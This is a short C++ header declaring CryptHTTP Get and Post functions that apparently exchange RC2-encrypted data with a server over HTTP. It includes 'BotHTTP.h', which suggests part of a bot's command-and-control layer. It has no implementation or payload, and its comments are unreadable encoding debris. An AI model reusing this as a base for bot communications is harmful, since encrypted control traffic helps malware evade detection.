//***************************************************************************
//
//  ������ �������� ����������� ����� ������� ���� � ��������
//
//***************************************************************************



//---------------------------------------------------------------------------

#ifndef CryptHTTPH
#define CryptHTTPH
//---------------------------------------------------------------------------

#include <windows.h>
#include "Strings.h"
#include "BotHTTP.h"


//****************************************************************************
//  CryptHTTP -  ������ ������������ ������ � HTTP ��������
//  ��� ���������� ������������ RC2Crypt
//****************************************************************************

namespace CryptHTTP
{
	// ��������� ����������� ��������
	bool Get(PCHAR URL, PCHAR Password, PCHAR *Buf, PHTTPResponse Response, bool MultiLineBuffer = false);

	// ������� ���������� ������������� ���� ������ �� ���������
	// �����. ���� ������ �� ���������� �������� ����
	bool Post(PCHAR URL, PCHAR Password, PStrings Fields, PCHAR *Buf, PHTTPResponse Response, bool MultiLineBuffer = false);
}

//---------------------------------------------------------------------------
#endif
